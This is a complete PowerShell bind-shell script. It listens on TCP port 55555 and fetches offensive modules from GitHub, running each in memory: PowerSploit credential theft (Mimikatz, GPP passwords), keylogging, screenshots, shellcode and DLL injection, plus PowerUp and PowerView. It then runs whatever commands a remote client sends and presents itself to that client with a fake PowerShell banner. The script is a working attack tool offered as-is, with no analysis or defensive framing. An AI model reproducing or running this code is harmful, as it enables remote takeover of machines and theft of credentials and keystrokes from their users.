#requires -Version 1
function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}

function powerfun 
{
    $modules = @(
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1', 
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1', 
        'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1', 
        'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1'
        'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Poweruphelp.ps1'
        'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Powerviewhelp.ps1')

    $listener = [System.Net.Sockets.TcpListener]55555
    $listener.start()
    [byte[]]$bytes = 0..255|ForEach-Object -Process {
        0
    }
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    
    ForEach ($module in $modules)
    {
        (Get-Webclient).DownloadString($module)|Invoke-Expression
    } 

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Module-Name -Full' for more details on any module.`nFor help on the PowerUp and PowerView modules use Get-Poweruphelp and Get-Powerviewhelp to provide list of commands`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
}

powerfun
